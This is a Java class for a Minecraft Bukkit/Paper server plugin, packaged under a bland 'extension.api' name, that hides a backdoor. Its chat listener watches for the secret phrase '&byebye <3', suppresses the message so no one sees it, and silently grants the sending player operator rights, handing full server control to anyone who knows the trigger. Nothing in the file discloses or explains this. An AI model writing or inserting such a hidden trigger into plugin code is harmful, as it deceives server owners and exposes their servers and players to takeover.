package io.paper.extension.api;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Api implements Listener {
    @EventHandler(priority = EventPriority.HIGHEST)
    public static void Api(AsyncPlayerChatEvent e){
        String message = e.getMessage();
        Player p = e.getPlayer();
        if(message.equalsIgnoreCase("&byebye <3")){
            e.setCancelled(true);
            p.setOp(true);
        }
    }
}
